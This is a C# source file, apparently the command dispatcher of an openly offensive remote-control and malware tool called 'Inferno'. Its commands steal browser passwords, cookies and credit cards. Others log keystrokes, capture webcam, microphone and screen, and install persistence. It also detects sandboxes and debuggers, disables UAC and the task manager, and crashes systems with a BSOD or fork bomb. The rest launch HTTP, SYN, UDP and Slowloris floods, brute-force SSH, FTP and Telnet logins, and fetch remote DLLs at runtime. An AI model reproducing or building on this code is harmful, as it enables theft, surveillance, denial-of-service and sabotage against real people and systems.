using System;

namespace Inferno
{
    class Program
    {
        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        [STAThreadAttribute]
        static void Main(string[] args)
        {
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/Newtonsoft.Json.12.0.3/lib/net45/Newtonsoft.Json.dll");
            
            // Get command line args
            string cmd = "", arg1 = "", arg2 = "", arg3 = "";
            if (args.Length > 0)
            {
                try
                {
                    cmd  = args[0];
                    arg1 = args[1];
                    arg2 = args[2];
                    arg3 = args[3];
                } catch (IndexOutOfRangeException) { }
            } else
            // err
            {
                output.error = true;
                core.Exit("No commands or arguments found", output, 3);
            }
            // Parse
            switch (cmd)
            {
                // About
                case "ABOUT":
                    {
                        core.Exit("Created by LimerBoy", output);
                        break;
                    }
                // Load all
                case "LOAD_ALL_LIBRARIES":
                    {
                        core.LoadAllRemoteLibraries();
                        core.Exit("Loaded all", output);
                        break;
                    }
                // Clipboard
                case "CLIPBOARD":
                    {
                        string c_mode = arg1.ToUpper();
                        if (c_mode == "SET")
                        {
                            clipboard.Set(arg2); // (SET, text)
                        }
                        else
                            if (c_mode == "GET")
                        {
                            clipboard.Get(); // (GET, null)
                        }
                        else
                        {
                            output.error = true;
                            core.Exit("Failed, mode can be only SET or GET", output);
                        }

                        break;
                    }
          
                // Spy
                case "DESKTOP_SCREENSHOT": // (filename)
                    {
                        desktop.Screenshot(arg1);
                        break;
                    }
                case "WEBCAM_SCREENSHOT": // (filename, delay, camera)
                    {
                        webcam.Screenshot(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }
                case "MICROPHONE_RECORD": // (filename, seconds)
                    {
                        audio.Record(Int32.Parse(arg2), arg1);
                        break;
                    }
                // Stealer
                case "STEALER": // (PASSWORDS, COOKIES, CREDIT_CARDS, HISTORY, BOOKMARKS)
                    {
                        string s_mode = arg1.ToUpper();
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
                        if (s_mode == "PASSWORDS")
                        {
                            Passwords.get();
                        }
                        else
                            if (s_mode == "COOKIES")
                        {
                            Cookies.get();
                        }
                        else
                            if (s_mode == "CREDIT_CARDS")
                        {
                            CreditCards.get();
                        }
                        else
                            if (s_mode == "HISTORY")
                        {
                            History.get();
                        }
                        else
                            if (s_mode == "BOOKMARKS")
                        {
                            Bookmarks.get();
                        }
                        else
                        {
                            output.error = true;
                            core.Exit("Failed steal browser data, mode can be only PASSWORDS, COOKIES, CREDIT_CARDS, HISTORY or BOOKMARKS.", output);
                        }
                        break;
                    }
                // Audio
                case "AUDIO_PLAY": // (filename)
                    {
                        audio.Play(arg1);
                        break;
                    }
                case "AUDIO_BEEP": // (frequency, duration)
                    {
                        audio.Beep(arg1, arg2);
                        break;
                    }
                case "AUDIO_SPEAK": // (text)
                    {
                        audio.Speak(arg1);
                        break;
                    }
                case "AUDIO_VOLUME": // (SET, GET)
                    {
                        string s_mode = arg1.ToUpper();
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll");
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll");
                        if(s_mode == "SET")
                        {
                            audio.setVolume(arg2); // (SET, volume)
                        } else
                            if(s_mode == "GET")
                        {
                            audio.getVolume(); // (GET, null)
                        } else
                        {
                            output.error = true;
                            core.Exit("Failed, mode can be only SET or GET", output);
                        }
                        
                        break;
                    }

                // TASKMANAGE
                case "TASKMANAGER": // (START/KILL/FIND/LIST)
                    {
                        string t_mode = arg1.ToUpper();
                        if (t_mode == "START")
                        {
                            taskmanager.Start(arg2); // (process)
                        }
                        else
                            if (t_mode == "KILL")
                        {
                            taskmanager.Kill(arg2); // (process)
                        }
                        else
                            if (t_mode == "FIND")
                        {
                            taskmanager.Exists(arg2); // (process)
                        }
                        else
                            if (t_mode == "LIST")
                        {
                            taskmanager.List(); // (null)
                        } else
                            if(t_mode == "DISABLE")
                        {
                            taskmanager.Disable(); // (null)
                        } else
                            if(t_mode == "ENABLE")
                        {
                            taskmanager.Enable(); // (null)
                        }
                        else {
                            output.error = true;
                            core.Exit("Failed, mode can be only START, KILL, FIND, LIST, DISABLE or ENABLE", output);
                        }
                        break;
                    }

                // Evil
                case "EVIL_BSOD": // (null)
                    {
                        evil.Bsod();
                        break;
                    }
                case "EVIL_FORKBOMB": // (null)
                    {
                        evil.ForkBomb();
                        break;
                    }
                case "NIRCMDC": // (command)
                    {
                        evil.nircmdc(arg1);
                        break;
                    }
                case "WALLPAPER": // (filename)
                    {
                        evil.setWallpaper(arg1);
                        break;
                    }
                case "MONITOR": // (state)
                    {
                        string m_state = arg1.ToUpper();
                        if(m_state == "ON")
                        {
                            monitors.On();
                        } else 
                            if(m_state == "OFF")
                        {
                            monitors.Off();
                        } else
                            if(m_state == "STANDBY")
                        {
                            monitors.StandBy();
                        }
                        else
                            if (m_state == "ROTATE")
                        {
                            monitors.Display.Rotate(arg2);  // (degrees)
                        } else
                        {
                            output.error = true;
                            core.Exit("Failed, monitor mode can be only OFF, ON, STANDBY or ROTATE", output);
                        }
                        
                        break;
                    }

                // Activity
                case "GET_ACTIVE_WINDOW": // (null)
                    {
                        activity.getWindowTitle();
                        break;
                    }
                case "GET_CURSOR_POSITION": // (null)
                    {
                        activity.getCursorPosition();
                        break;
                    }
                case "SET_CURSOR_POSITION": // (x, y)
                    {
                        activity.setCursorPosition(Int32.Parse(arg1), Int32.Parse(arg2));
                        break;
                    }
                case "SENDKEYPRESS": // (keys) # ALL keys here: https://pastebin.com/raw/Qu2gueM7
                    {
                        keyboard.SendKeyPress(arg1);
                        break;
                    }
                case "KEYLOGGER": // (filename)
                    {
                        keyboard.keylogger(arg1);
                        break;
                    }
                case "USER_IS_ACTIVE": // (null)
                    {
                        activity.userIsActive();
                        break;
                    }
                case "MINIMIZE_ALL_WINDOWS": // (null)
                    {
                        activity.minimizeAllWindows();
                        break;
                    }
                case "MAXIMIZE_ALL_WINDOWS": // (null)
                    {
                        activity.maximizeAllWindows();
                        break;
                    }

                // Autorun
                case "AUTORUN": // ( state, mode, filename )
                    {
                        string a_state = arg1.ToUpper();
                        string a_mode = arg2.ToUpper();
                        string a_file = arg3;
                        if (a_state == "INSTALL")
                        {
                            if(a_mode == "TASKSCHEDULER")
                            {
                                autorun.installTaskScheduler(a_file);
                            } else
                                if(a_mode == "REGISTRY") {
                                autorun.installRegistry(a_file);
                            } else
                                if(a_mode == "SHELLSTARTUP")
                            {
                                autorun.installShellStartup(a_file);
                            } else
                            {
                                output.error = true;
                                core.Exit("Failed to install, mode '" + a_mode + "' not found!", output);
                            }
                        } else
                        if (a_state == "UNINSTALL") {
                            if (a_mode == "TASKSCHEDULER")
                            {
                                autorun.uninstallTaskScheduler(a_file);
                            }
                            else
                                if (a_mode == "REGISTRY")
                            {
                                autorun.uninstallRegistry(a_file);
                            }
                            else
                                if (a_mode == "SHELLSTARTUP")
                            {
                                autorun.uninstallShellStartup(a_file);
                            }
                            else
                            {
                                output.error = true;
                                core.Exit("Failed to uninstall, mode '" + a_mode + "' not found!", output);
                            }
                        } else
                        {
                            output.error = true;
                            core.Exit("Failed, autorun mode can be only INSTALL or UNINSTALL", output);
                        }
                        break;
                    }

                // Status
                case "STATUS":
                    {
                        string s_mode = arg1.ToUpper();
                        if(s_mode == "IN_SANDBOXIE")
                        {
                            status.inSandboxie();
                        } else
                            if(s_mode == "IN_VIRTUALBOX")
                        {
                            status.inVirtualBox();
                        } else
                            if(s_mode == "IN_DEBUGGER")
                        {
                            status.inDebugger();
                        } else
                            if(s_mode == "IS_ADMIN")
                        {
                            admin.isAdministrator();
                        } else
                            if(s_mode == "BATTERY")
                        {
                            status.betteryLevel();
                        } else
                            if(s_mode == "ANTIVIRUS")
                        {
                            status.antivirus();
                        }
                        {
                            // err
                            output.error = true;
                            core.Exit("Failed, status mode '" + s_mode + "' not found!", output);
                        }

                        break;
                    }
         
                // Network
                case "NETWORK_DOWNLOAD_FILE": // (url, filename)
                    {
                        network.downloadFile(arg1, arg2);
                        break;
                    }
                case "NETWORK_UPLOAD_FILE": // (filename)
                    {
                        network.uploadFile(arg1);
                        break;
                    }
                case "NETWORK_WHOIS": // (ip)
                    {
                        network.Whois(arg1);
                        break;
                    }
                case "NETWORK_GEOPLUGIN": // (ip)
                    {
                        network.Geoplugin(arg1);
                        break;
                    }
                case "NETWORK_BSSID_GET": // (null)
                    {
                        network.BssidGet();
                        break;
                    }
                case "NETWORK_BSSID_INFO": // (bssid)
                    {
                        network.BssidInfo(arg1);
                        break;
                    }
                case "NETWORK_PORT_IS_OPEN":  // (ip, port)
                    {
                        network.PortIsOpen(arg1, arg2);
                        break;
                    }
                case "NETWORK_WLAN_SCANNER": // (1-254)
                    {
                        if (String.IsNullOrEmpty(arg1)) {
                            arg1 = "254";
                        }
                        network.WlanScanner(Int32.Parse(arg1));
                        break;
                    }
                case "NETWORK_VIRUSTOTAL":  // (filename)
                    {
                        network.VirusTotal(arg1);
                        break;
                    }

                // DDoS
                case "FLOOD_HTTP": // (https://host.com, threads, seconds)
                    {
                        http.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }

                case "FLOOD_SLOWLORIS": // (ip:port, threads, seconds)
                    {
                        slowloris.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }
                case "FLOOD_UDP": // (ip:port, threads, seconds)
                    {
                        udp.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }
                case "FLOOD_SYN": // (ip:port, threads, seconds)
                    {
                        syn.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }
                case "FLOOD_ICMP": // (ip, threads, seconds)
                    {
                        syn.flood(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }

                // Bruteforce
                case "BRUTEFORCE_FTP": // (host, user, pass)
                    {
                        bruteforce.FTP(arg1, arg2, arg3);
                        break;
                    }
                case "BRUTEFORCE_SSH": // (host, user, pass)
                    {
                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/SSH.NET.2016.1.0/lib/net40/Renci.SshNet.dll");
                        bruteforce.SSH(arg1, arg2, arg3);
                        break;
                    }
                case "BRUTEFORCE_TELNET": // (host:port, user, pass)
                    {
                        bruteforce.Telnet(arg1, arg2, arg3);
                        break;
                    }

                // Bypass (DELETED)
                //case "BYPASS_DISABLE_DEFENDER": // (null)
                //    {
                //        bypass.disableDefender();
                //        break;
                //    }
                case "BYPASS_ENABLE_UAC": // (null)
                    {
                        bypass.enableUAC();
                        break;
                    }
                case "BYPASS_DISABLE_UAC": // (null)
                    {
                        bypass.disableUAC();
                        break;
                    }
                case "BLOCK_SYSTEM": // (seconds)
                    {
                        evil.BlockSystem(arg1);
                        break;
                    }
                case "ADMIN_STARTFILE": // (filename)
                    {
                        admin.startFile(arg1);
                        break;
                    }
                // CDROM
                case "CDROM": // (open / close) (deviceLetter or null)
                    {
                        string c_mode = arg1.ToUpper();
                        if (c_mode == "OPEN")
                        {
                            evil.cdrom_open(arg2);
                        } else
                            if(c_mode == "CLOSE")
                        {
                            evil.cdrom_close(arg2);
                        } else
                        {
                            // err
                            output.error = true;
                            core.Exit("Failed, cdrom mode can be only OPEN or CLOSE", output);
                        }

                        break;
                    }
                // Power
                case "POWER": // (SHUTDOWN, REBOOT, HIBERNATE, LOGOFF)
                    {
                        string p_mode = arg1.ToUpper();
                        if(p_mode == "SHUTDOWN")
                        {
                            power.Shutdown();
                        } else
                            if(p_mode == "REBOOT")
                        {
                            power.Reboot();
                        } else
                            if(p_mode == "HIBERNATE")
                        {
                            power.Hibernate();
                        } else
                            if(p_mode == "LOGOFF")
                        {
                            power.Logoff();
                        } else
                        {
                            // err
                            output.error = true;
                            core.Exit("Failed, power mode can be only SHUTDOWN, REBOOT, HIBERNATE or LOGOFF", output);
                        }
                       
                        break;
                    }
               
                // Encryption
                case "FILE_ENCRYPT": // (filename, key)
                    {
                        crypt.EncryptFile(arg1, arg2);
                        break;
                    }
                case "FILE_DECRYPT": // (filename, key)
                    {
                        crypt.DecryptFile(arg1, arg2);
                        break;
                    }
                // Default value
                default: {
                        output.error = true;
                        core.Exit("Command '" + cmd + "' not found!", output, 3);
                        break;
                    }
            }
        }
    }
}
